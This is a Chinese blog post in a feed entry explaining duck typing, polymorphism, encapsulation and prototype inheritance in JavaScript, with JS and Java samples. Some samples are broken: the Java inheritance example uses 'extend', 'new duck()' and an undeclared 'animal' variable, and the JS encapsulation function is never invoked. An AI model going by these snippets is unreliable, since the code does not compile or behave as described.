title="一、动态类型语言和鸭子模型"></a>一、动态类型语言和鸭子模型</h3><p>编程语言按照数据类型大体可分为两类：<strong>静态类型语言</strong>、<strong>动态类型语言</strong></p><p>静态类型语言在编译时便已经确定变量的类型，而动态类型语言的变量类型要到程序运行的时候，待变量被赋予某个值后，才会具有某种类型。</p><ol><li><p>静态语言</p><ul><li><p>优点：</p><p>在编译时就能发现类型不匹配的错误，如果在程序中明确规定了数据类型，编译器还可以针对这些信息对程序进行一些优化的工作，提高程序执行速度</p></li><li><p>缺点：</p><p>迫使程序员按照锲约来编写程序，类型的声明会增加更多代码</p></li></ul></li><li><p>动态语言</p><ul><li><p>优点：</p><p>编写的代码数量少，更加简洁</p></li><li><p>缺点：</p><p>无法保证变量的类型，从而在程序的运行期有可能发生跟类型相关的错误</p></li></ul></li></ol><p>在JavaScript中，当我们对一个变量赋值时，虽然不需要考虑他的类型，因此，<strong>JavaScript是一门典型的动态类型语言。</strong></p><p>这一切都建立在鸭子类型的概念上，鸭子类型的通俗说法是：”如果它走起路来像鸭子，叫起来也像鸭子，那么它就是鸭子。”</p><p>我们可以通过一个小故事来更深刻的了解鸭子类型：</p><blockquote><p>​从前在JavaScript的王国里，有一个国王，他觉得世界上最美妙的声音就是鸭子叫声，于是国王召集大臣，要组建一个1000只鸭子组成的合唱团。大臣们找遍了全国，终于找到了999只鸭子，但始终还差一只，最后大臣发现有一只非常特别的鸡，它的叫声跟鸭子一摸一样，于是这只鸡就成为了合唱团的最后一员。</p></blockquote><p>这个故事告诉我们，国王要听的只是鸭子的叫声，这个声音的主人到底是鸡还是鸭并不重要，鸭子类型指导我们只关注对象的行为，而不关注对象本身。</p><h3 id="二、多态"><a href="#二、多态" class="headerlink" title="二、多态"></a>二、多态</h3><p>多态的实际含义是：同一操作作用于不同的对象上面，可以产生不同的解释和不同的执行结果，换句话说，给不同的对象发送同一个消息的时候，这些对象会根据这个消息分别给出不同的反馈。</p><p>从字面意思理解多态不太容易，下面我们来举例说明一下。</p><blockquote><p>主人家里养了两只动物，分别是一只鸡和一只鸭，当主人向他们发出”叫”的命令时，鸭会”嘎嘎嘎”地叫，而鸡会”咯咯咯”地叫。这两只动物都会以自己的方式来发出叫声。它们同样”都是动物，并且可以发出叫声”，但根据主人的指令，它们会各自发出不同的叫声。</p></blockquote><ol><li><h4 id="一段”多态”的JavaScript代码"><a href="#一段”多态”的JavaScript代码" class="headerlink" title="一段”多态”的JavaScript代码"></a>一段”多态”的JavaScript代码</h4><p>我们把上面的故事用JavaScript代码实现如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> makeSound = <span class="keyword">function</span>(<span class="params">animal</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(animal <span class="keyword">instanceof</span> <span class="title class_">Duck</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嘎嘎嘎&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(animal <span class="keyword">instanceof</span> <span class="title class_">Chicken</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;咯咯咯&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Duck</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Chicken</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"><span class="title function_">makeSound</span>(<span class="keyword">new</span> <span class="title class_">Duck</span>());</span><br><span class="line"><span class="title function_">makeSound</span>(<span class="keyword">new</span> <span class="title class_">Chicken</span>());</span><br></pre></td></tr></table></figure><p>这段代码确实体现了”多态性”，当我们分别向鸭和鸡发出”叫唤”的消息时，它们根据此消息做出了各自不同的反应，但是这样的”多态性”是无法令人满意的，如果后来增加一只动物，此时我们必须要改动<code>makeSound</code>函数，修改代码总是危险的，当动物的种类越来越多时，<code>makeSound</code>有可能变成一个巨大的函数。</p><p>多态背后的思想是将”做什么”和”谁去做以及怎样做”分离开来，也就是将”不变的事物”与”可能改变的事物”分离开来。在这个故事中，动物会叫，这个是不变的，但是不同类型的动物具体怎么叫是可变的，把不变的部分隔离出来，把可变的部分封装起来，这给予了我们扩展程序的能力，程序看起来可生长的，也是符合开放-封闭原则的，相对于修改代码来说，仅仅增加代码就能完成同样的功能，这显然优雅和安全得多。</p></li><li><h4 id="对象的多态性"><a href="#对象的多态性" class="headerlink" title="对象的多态性"></a>对象的多态性</h4><p>下面是改写后的代码，首先我们把不变的部分隔离出来，那就是所有的动物都会发出叫声：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> makeSound = <span class="keyword">function</span>(<span class="params">animal</span>)&#123;</span><br><span class="line">    animal.<span class="title function_">sound</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把可变的部分各自封装起来，我们刚才谈到的多态性实际上是对象的多态性：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Duck</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="title class_">Duck</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sound</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嘎嘎嘎&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Chicken</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="title class_">Chicken</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sound</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;咯咯咯&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">makeSound</span>(<span class="keyword">new</span> <span class="title class_">Duck</span>());</span><br><span class="line"><span class="title function_">makeSound</span>(<span class="keyword">new</span> <span class="title class_">Chicken</span>());</span><br></pre></td></tr></table></figure></li><li><h4 id="检查类型和多态"><a href="#检查类型和多态" class="headerlink" title="检查类型和多态"></a>检查类型和多态</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Duck</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;嘎嘎嘎&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;咯咯咯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalSound</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">(Duck duck)</span>&#123;    <span class="comment">// (1)</span></span><br><span class="line">        duck.makeSound();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">AnimalSound</span> <span class="variable">animalSound</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnimalSound</span>();</span><br><span class="line">        <span class="type">Duck</span> <span class="variable">duck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">duck</span>();</span><br><span class="line">        animalSound.makeSound(duck);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>已经顺利让鸭子可以发出叫声，但如果现在想要鸡也叫起来，我们发现这是一件不可能实现的事情，因为(1)处<code>AnimalSound</code>类的<code>makeSound</code>方法，被我们规定为只能接受Duck类型的参数。</p><p>某些时候，在享受静态语言类型检查带来安全性的同时，我们亦会感觉被束缚了手脚。</p><p>为了解决这一问题，静态类型的面向对象语言通常被设计为可以<strong>向上转型</strong>：当给一个类变量赋值时，这个变量的类型既可以使用这个类本身，也可以使用这个类的超类。就像我们描述天上的一只麻雀或者一只喜鹊，通常可以说”一只麻雀在飞”或者”一只喜鹊在飞”。但如果想忽视他们的具体类型，那么也可以说”一只鸟在飞”。</p><p>同理，当Duck对象和Chicken对象的类型都被隐藏在超类型的Animal身后，Duck对象和Chicken对象就能被交换使用，这是让对象表现出多态性的必经之路，而多态性的表现正是实现众多设计模式的目标。</p></li><li><h4 id="使用继承得到多态效果"><a href="#使用继承得到多态效果" class="headerlink" title="使用继承得到多态效果"></a>使用继承得到多态效果</h4><p>使用继承来得到多态效果，是让对象表现出多态性的最常用手段。</p><p>我们先创建一个Animal抽象类，再分别让Duck和Chicken都继承自Animal抽象类，下面代码中(1)处和(2)处的赋值语句显然是成立的，因为鸭子和鸡也是动物</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span>;  <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chicken</span> extend Animal &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;咯咯咯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Duck</span> extend Animal &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;嘎嘎嘎&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Animal</span> <span class="variable">duck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Duck</span>();       <span class="comment">// (1)</span></span><br><span class="line"><span class="type">Animal</span> <span class="variable">Chicken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Chicken</span>(); <span class="comment">// (2)</span></span><br></pre></td></tr></table></figure><p>现在剩下的就是让<code>AnimalSound</code>类的<code>makeSound</code>方法接受Animal类型的参数，而不是具体的Duck类型或者Chicken类型：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalSound</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">(Animal animal)</span>&#123;</span><br><span class="line">        animal.makeSound();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">AnimalSound</span> <span class="variable">animalSound</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnimalSound</span>();</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">duck</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Duck</span>();</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">Chicken</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Chicken</span>();</span><br><span class="line">        animal.makeSound(duck);</span><br><span class="line">        animal.makeSound(chicken);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="JavaScript的多态"><a href="#JavaScript的多态" class="headerlink" title="JavaScript的多态"></a>JavaScript的多态</h4><p>在java中可以通过向上转型来实现，而JavaScript的变量类型在运行期是可变的，一个JavaScript对象，既可以表示Duck类型的对象，又可以表示Chicken类型的对象，这意味着JavaScript对象的多态性是与生俱来的。</p><p>在JavaScript中，并不需要向上转型之类的技术来取得多态的效果</p></li><li><h4 id="多态在面向对象程序设计中的作用"><a href="#多态在面向对象程序设计中的作用" class="headerlink" title="多态在面向对象程序设计中的作用"></a>多态在面向对象程序设计中的作用</h4><p>Martin Fowler在《重构：改善既有代码的设计》里写道：</p><blockquote><p>多态的最根本好处在于，你不必再向对象询问”你是什么类型”而后根据得到的答案调用对象的某个行为——你只管调用该行为就是了，其他的一切多态机制都会为你安排妥当。</p></blockquote><p>Martin Fowler的话可以用下面这个例子很好的诠释：</p><blockquote><p>在电影的拍摄现场，当导演喊出”action”时，主角开始背台词，照明师负责打灯，后面的群众演员假装中枪倒地，道具师往镜头前撒上雪花。在得到同一消息时，每个对象都知道自己应该做什么。如果不利于对象的多态性，而是用面向对象的方式来编写这段代码，那么相当于在电影开始拍摄之后，导演每次都要走到每个人面前，确认它们的职业分工（类型），然后告诉它们要做什么。如果映射到程序中，那么程序中将充斥着条件分支语句。</p></blockquote><p><strong>将行为分布在各个对象中，并让这些对象各自负责自己的行为，这正是面向对象的程序设计</strong></p></li></ol><p>​</p><h3 id="三、封装"><a href="#三、封装" class="headerlink" title="三、封装"></a>三、封装</h3><p><strong>封装的目的是将信息隐藏</strong></p><ol><li><h4 id="封装数据"><a href="#封装数据" class="headerlink" title="封装数据"></a>封装数据</h4><p>只能依赖变量的作用域来实现封装特性，而且只能模拟出public和private这两种封装性。</p><p>除了ES6中提供的let之外，一般我们通过函数来创建作用域。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _name = <span class="string">&#x27;seven&#x27;</span>;        <span class="comment">// 创建private变量</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;    <span class="comment">// 公开public方法</span></span><br><span class="line">            <span class="keyword">return</span> _name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在ES6中，还可以通过Symbol创建私有属性。</p></li><li><h4 id="封装实现"><a href="#封装实现" class="headerlink" title="封装实现"></a>封装实现</h4><p>封装实现细节的例子非常多，拿迭代器来说明，迭代器的作用是在一个不暴露一个聚合对象的内部表示的前提下，提供一种方式来顺序访问这个聚合对象。我们编写了一个each函数，它的作用就是遍历一个聚合对象，使用这个each函数的人不用关心它的内部代码是怎样实现的，只要它提供的功能正确便可以。即使each函数修改了内部源码，只要对外的接口或者调用方式没有变化，用户就不用关心它内部实现的改变。</p></li><li><h4 id="封装类型"><a href="#封装类型" class="headerlink" title="封装类型"></a>封装类型</h4><p>封装类型是静态类型语言中一种重要的封装方式，一般而言，封装类型是通过抽象类和接口来进行的。把对象的真正类型隐藏在抽象类或者接口之后，相比对象的类型，客户更关心对象的行为，在许多静态语言的设计模式中，想方设法地去隐藏对象的类型，也是促使这些模式诞生的原因之一。比如工厂方法模式、组合模式等。</p></li></ol><h3 id="四、原型模式基于原型继承的JavaScript对象系统"><a href="#四、原型模式基于原型继承的JavaScript对象系统" class="headerlink" title="四、原型模式基于原型继承的JavaScript对象系统"></a>四、原型模式基于原型继承的JavaScript对象系统</h3><p>原型模式不单是一种设计模式，也称为一种编程泛型。</p><ol><li><h4 id="使用克隆的原型模式"><a href="#使用克隆的原型模式" class="headerlink" title="使用克隆的原型模式"></a>使用克隆的原型模式</h4><p>原型模式是用于创建对象的一种模式，如果我们要创建一个对象，一种方法是先指定它的类型，然后通过类来创建对象。原型模式选择了另一种方式，我们不再关心对象的具体类型，而是找到一个对象，然后通过克隆来创建一个一摸一样的对象。</p><p>原型模式的实现关键，是语言本身是否提供了clone方法。ES5提供了 <code>Object.create</code> 方法，可以用来克隆对象。</p></li><li><h4 id="克隆是创建对象的手段"><a href="#克隆是创建对象的手段" class="headerlink" title="克隆是创建对象的手段"></a>克隆是创建对象的手段</h4><p>原型模式提供了另一种创建对象的方式，通过克隆对象，我们就不用再关心对象的具体类型名字。这就像一个仙女要送给三岁小女孩生日礼物，虽然小女孩可能还不知道飞机或者船怎么说，但她可以指着商店橱柜里的飞机模型说”我要这个”。</p><p>当然在JavaScript这种类型模糊的语言中，创建对象非常容易，也不存在类型耦合的问题。从设计模式的角度来讲，原型模式的意义比不算大。但JavaScript本身是一门基于原型的面向对象语言，它的对象系统就是使用原型模式搭建的，在这里称之为原型编程范型也许更合适。</p></li><li><h4 id="体验Io语言"><a href="#体验Io语言" class="headerlink" title="体验Io语言"></a>体验Io语言</h4><p>在JavaScript语言中不存在类的概念，对象也并非从类中创建出来的，所有的JavaScript对象都是从某个对象上克隆而来的。</p><p>JavaScript基于原型的面向对象系统参考了Self语言和Smalltalk语言，为了搞清JavaScript中的原型，我们本该寻根溯源这两门语言，但由于这两门语言距离现在是在太遥远，我们转而了解一下另外一种轻巧又基于原型的语言——Io语言。</p><p>作为一门基于原型的语言，Io中同样没有类的概念，每一个对象都是基于另外一个对象的克隆。在Io中，根对象名为Object。</p></li><li><h4 id="原型编程范型的一些规则"><a href="#原型编程范型的一些规则" class="headerlink" title="原型编程范型的一些规则"></a>原型编程范型的一些规则</h4><p>如果A对象是从B对象克隆而来，那么B对象就是A对象的原型。每个对象都有原型，这个原型还有属于自己的原型，最终形成了原型链，原型链最顶端是null。基于原型链的委托机制就是原型继承的本质</p><p>为什么设计原型：继承，让对象的属性和方法共享。</p><p>原型编程中的一个重要特征：当对象无法响应某个请求时，会把该请求对象委托给它自己的原型。</p><p>原型编程规范至少包括以下基本准则</p><ul><li><p>所有的数据都是对象</p></li><li><p>要得到一个对象，不是通过实例化，而是找到一个对象作为原型并克隆它</p></li><li><p>对象会记住它的原型</p></li><li><p>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</p></li></ul></li><li><h4 id="JavaScript中的原型继承"><a href="#JavaScript中的原型继承" class="headerlink" title="JavaScript中的原型继承"></a>JavaScript中的原型继承</h4><ol><li><h5 id="所有数据都是对象"><a href="#所有数据都是对象" class="headerlink" title="所有数据都是对象"></a>所有数据都是对象</h5><p>按照JavaScript设计者的本意，除了underfined之外，一切都应是对象，事实上，JavaScript中的根对象是 <code>Object.prototype</code> 对象。<code>Object.prototype</code>对象是一个空对象。我们在遇到的每个对象，实际上都是从 <code>Object.prototype</code> 对象克隆而来的，<code>Object.prototype</code> 对象就是它们的原型。</p></li><li><h5 id="要得到一个对象，不是通过实例化，而是找到一个对象作为原型并克隆它"><a href="#要得到一个对象，不是通过实例化，而是找到一个对象作为原型并克隆它" class="headerlink" title="要得到一个对象，不是通过实例化，而是找到一个对象作为原型并克隆它"></a>要得到一个对象，不是通过实例化，而是找到一个对象作为原型并克隆它</h5><p>在JavaScript语言里，我们并不关心克隆的细节，因为这是引擎内部负责实现的，我们所需要做的只是显式地调用 <code>var obj1 = new Object()</code> 或者 <code>var obj2 = &#123;&#125;</code> 。此时，引擎内部会从<code>Object.prototype</code> 上面克隆一个对象出来，我们最终得到地就是这个对象。</p><p>JavaScript的函数既可以作为普通函数被调用，也可以作为构造器被调用。当使用new运算符来调用函数时，此时的函数就是一个构造器。用new运算符来创建对象的过程，实际上也只是先克隆 <code>Object.prototype</code> 对象，再进行一些其他额外操作的过程。</p><p><strong>JavaScript是通过克隆<code>Object.prototype</code>来得到新的对象，但实际上并不是每次都真正克隆了一个新的对象</strong></p></li><li><h5 id="对象会记住它的原型"><a href="#对象会记住它的原型" class="headerlink" title="对象会记住它的原型"></a>对象会记住它的原型</h5><p>JavaScript给对象提供了一个名为<code>__proto__</code>的隐藏属性，某个对象的<code>__proto__</code>属性会默认指向它的构造器的原型对象，即 <code>&#123;Constructor&#125;.prototype</code>。在一些浏览器中，<code>__proto__</code>被公开出来。</p><p>实际上，<code>__proto__</code>就是对象跟”对象构造器的原型”联系起来的纽带。因为对象要通过<code>__proto__</code>属性来记住它的构造对象的原型。</p></li><li><h5 id="如果对象无法响应某个请求，它会把这个请求委托给它自己的原型"><a href="#如果对象无法响应某个请求，它会把这个请求委托给它自己的原型" class="headerlink" title="如果对象无法响应某个请求，它会把这个请求委托给它自己的原型"></a>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</h5><p>这条规则即是原型继承的精髓所在。JavaScript的克隆跟Io语言还是有点不一样，Io中每个对象都可以作为原型被克隆，当Animal对象克隆自Object对象，Dog对象又克隆自Animal对象时，就形成了一条天然的原型链。</p><p>而在JavaScript中，每个对象都是从 <code>Object.prototype</code> 对象克隆而来的，如果是这样的话，我们只能得到单一的继承关系，即每个对象都继承自  <code>Object.prototype</code> 对象，这样的对象系统显然是受限的。</p><p>实际上，虽然JavaScript的对象最初都是由 <code>Object.prototype</code> 对象克隆而来的，但对象构造器的原型并不仅限于 <code>Object.prototype</code> 上，而是可以动态指向其他对象。这样一来，当对象a需要借用对象b的能力时，可以有选择性的把对象a的构造器的原型指向对象b，从而达到继承的效果。</p><p>下面的代码是我们最常用的原型继承方式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;seven&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> A = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span> = obj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">name</span>);  <span class="comment">// seven</span></span><br></pre></td></tr></table></figure><p>当我们期望得到一个”类”继承自另外一个”类”的效果时：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> A = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span> = &#123; <span class="attr">name</span>: <span class="string">&#x27;seven&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> B = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line">B.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title function_">B</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>)   <span class="comment">// seven</span></span><br></pre></td></tr></table></figure></li></ol></li><li><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul><li>JavaScript中一切引用类型都是对象，对象就是属性的集合</li><li>Array类型、Function类型、Object类型、Date类型、RegExp类型都是引用类型</li><li>原型存在的意义就是组成原型链</li><li>原型链存在的意义就是继承</li><li>继承存在的意义就是属性共享</li><li>构造函数用来创建对象，同一构造函数创建的对象，其原型相同</li><li>对象有 <code>__proto__</code> 属性，函数有 <code>__proto__</code> 属性，数组也有 <code>__proto__</code> 属性，只要是引用类型，就有 <code>__proto__</code> 属性，指向其原型</li><li>只有函数有 <code>prototype</code> 属性，指向new操作符加调用该函数创建的对象实例的原型对象</li><li>instanceof运算符用于检查右边构造函数的 <code>prototype</code> 属性是否出现在左边对象的原型链中的任何位置，其他它则表示的是一种原型链的继承关系</li><li>继承意味着复制操作，然而JavaScript默认并不会复制对象的属性，相反，JavaScript只是在两个对象之间创建一个关联，这样，一个对象就可以通过委托访问另一个对象的属性</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;JavaScript没有提供传统面向对象语言中的类式继承，而是通过原型委托的方式来实现对象与对象之间的继承，也没有在语言层面提供对抽象类和接口的支持&lt;/p&gt;
&lt;h3 id=&quot;一、动态类型语言和鸭子模型&quot;</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
</feed>
